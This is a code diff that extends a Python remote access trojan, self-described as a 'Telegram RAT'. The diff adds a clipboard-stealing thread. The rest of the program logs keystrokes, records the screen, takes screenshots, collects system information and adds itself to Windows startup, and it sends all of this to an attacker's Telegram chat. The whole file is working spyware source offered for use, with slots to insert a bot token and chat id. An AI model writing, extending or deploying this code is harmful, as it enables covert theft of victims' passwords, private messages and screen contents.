@@ -1,6 +1,8 @@
+##################################################      IMPORTS     #####################################################
 import cv2
 import numpy as np
 import pyautogui
+import pyperclip
 import telebot 
 import threading 
 import platform
@@ -12,12 +14,49 @@ from pynput import keyboard
 import winreg
 import sys
 import time
-time.sleep(60)
-token = ''  #<<<<<<<<<--------INSERT YOUR BOT TOKEN HERE<<<<<<<<<<<----------
-chat_id =   #<<<<<<<<<--------INSERT YOUR CHAT ID HERE<<<<<<<<<<<<<-----------
+##########################################################################################################################
+
+
+
+##############################################      Configurations     #####################################################
+token = '' #<<<<<<<<<<<<<<<INSERT YOUR BOT TOKEN<<<<<<<<<<<<
+chat_id =   #<<<<<<<<<<<<<<<<INSERT YOUR CHAT ID<<<<<<<<<<<<<<
 LOG_FILE = "keylog.txt"
 MAX_SIZE_MB = 1 / 1024
 bot = telebot.TeleBot(token)
+############################################################################################################################
+
+
+#######################################################     All The Functions     #################################################################
+
+
+
+############3#################     CLIPBOARD MONITOR FUNCTION     ###############################
+def clipboard_monitor_thread(output_file="clipboard_log.txt", poll_interval=1):
+    last_clipboard = None
+    try:
+        with open(output_file, "a", encoding="utf-8") as f:
+            while True:
+                clipboard_content = pyperclip.paste()
+                if clipboard_content and clipboard_content != last_clipboard:
+                    last_clipboard = clipboard_content
+                    f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n{clipboard_content}\n")
+                    f.flush()
+                    bot.send_message(chat_id, f"Clipboard updated:\n{clipboard_content}") 
+                time.sleep(poll_interval)
+    except Exception as e:
+        bot.send_message(chat_id, f"Clipboard monitoring stopped: {e}")
+
+
+def start_clipboard_monitor(output_file="clipboard_log.txt", poll_interval=1):
+    monitor_thread = threading.Thread(target=clipboard_monitor_thread, args=(output_file, poll_interval), daemon=True)
+    monitor_thread.start()
+    return monitor_thread
+##################################################################################################
+
+
+
+################################     ADD TO STARTUP FUNCTION     ###############################
 def add_to_startup(app_name="rat"):
     
     file_path = os.path.abspath(sys.argv[0])
@@ -30,6 +69,10 @@ def add_to_startup(app_name="rat"):
             return True
     except Exception as e:
         return False
+#################################################################################################
+
+
+################################     SCREEN RECORD FUNCTION     ###############################
 def screen_record(duration_seconds, output_file="screen_record.avi", fps=20):
     screen_size = pyautogui.size()
     fourcc = cv2.VideoWriter_fourcc(*"XVID")
@@ -44,6 +87,10 @@ def screen_record(duration_seconds, output_file="screen_record.avi", fps=20):
             break
     out.release()
     cv2.destroyAllWindows()
+################################################################################################
+
+
+################################     KEYLOGGER FUNCTION     ###############################
 def keylogger():
     def file_size_exceeds_limit(filepath, max_size_mb):
         if os.path.exists(filepath):
@@ -71,13 +118,23 @@ def keylogger():
                 log_file.write(f'[{key.name}]')
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+############################################################################################3
 
+
+################################     STARTUP MESSAGE FUNCTION     ###############################
 def startup_message():
     try:
         bot.send_message(chat_id, "Telegram RAT started and running.")
     except Exception:
         pass
+#################################################################################################
 
+
+##########################################     COMMAND HANDLING FUNCTIONS     ################################################
+
+
+
+####################3#############     SYSTEM INFO FUNCTION     ###############################
 @bot.message_handler(commands=['sysinfo'])
 def sysinfo(message):
     info = (
@@ -107,7 +164,11 @@ def sysinfo(message):
         bot.send_message(chat_id,info)
     except Exception as w:
         bot.send_message(chat_id,f"ERROR OCCURED {w}")
+################################################################################################3
 
+
+
+####3###################     RECORD SCREEN FUNCTION     ###############################
 @bot.message_handler(commands=['record'])
 def record(message):
     time = message.text[len('/record '):].strip()
@@ -116,7 +177,8 @@ def record(message):
     elif not time.isdigit() or int(time) <= 0:
         bot.send_message(chat_id, "Please provide a valid duration in seconds. send it as a whole number.")
     elif int(time) >= 300:
-        bot.send_message(chat_id, "Duration too long.It is recommended to keep it under 5 minutes.") #You can change this limit as per your requirement :) be careful telegram wont send files more than 2 GB!
+        bot.send_message(chat_id, "Duration too long.It is recommended to keep it under 5 minutes.") #You can change this limit as per your requirement :) 
+                                                                                                     #be careful telegram wont send files more than 2 GB!
     else:
         try:
             screen_record(int(time))
@@ -125,7 +187,11 @@ def record(message):
             os.remove("screen_record.avi")
         except Exception as e:
             bot.send_message(chat_id, f"Error: {str(e)}")     
+######################################################################################
 
+
+
+#######################     START/HELP COMMAND FUNCTION     ###############################
 @bot.message_handler(commands=['start','help'])
 def print(message):
     commands = (
@@ -137,7 +203,11 @@ def print(message):
     "6)/record - [record the screen for a specified duration in seconds]\n"
     )
     bot.send_message(chat_id,f"COMMANDS \n{commands}")
+###########################################################################################
 
+
+
+#######################     SPEECH FUNCTION     ###############################
 @bot.message_handler(commands=['speech'])
 def speech(message):
     try:
@@ -149,7 +219,11 @@ def speech(message):
             bot.send_message(chat_id,'USE LIKE THIS /speech [what you want me to say]')
     except Exception as e:
         bot.send_message(chat_id,f'error:{str(e)}')
+###############################################################################
 
+
+
+#######################     SCREENSHOT FUNCTION     ###############################
 @bot.message_handler(commands=['screenshot'])
 def capture(message):
     count = 0
@@ -167,8 +241,10 @@ def capture(message):
                         os.remove(tmp_path)
         except Exception as e:
                     bot.send_message(chat_id,f"ERROR:{e}")
-    
+###########################################################################################
 
+
+########################     FETCH KEYLOG FILE FUNCTION     ###############################
 @bot.message_handler(commands=['fetch'])
 def send_key_log_file(message):
     try:
@@ -176,17 +252,29 @@ def send_key_log_file(message):
             bot.send_document(chat_id,document=f)
     except Exception as e:
         bot.send_message(chat_id,f'AN ERROR OCCURED:::{e}')
+############################################################################################
 
+
+#########################     PERSISTENCE FUNCTION     ###############################
 @bot.message_handler(commands=['startup'])
 def persistant(message):
     if add_to_startup():
         bot.send_message(chat_id,f"Added successfully [0_0]")
     else:
         bot.send_messgae(chat_id,f'failed to add in startup.')
+######################################################################################
+
+
+##########################     COMMAND EXECUTION FUNCTION     ###############################
 if __name__ == '__main__':
     threading.Thread(target=startup_message).start()
     keylogger_thread = threading.Thread(target=keylogger)
     keylogger_thread.start()
+    thread = start_clipboard_monitor()
     bot.polling()
+############################################################################################
+
+
+
 
 
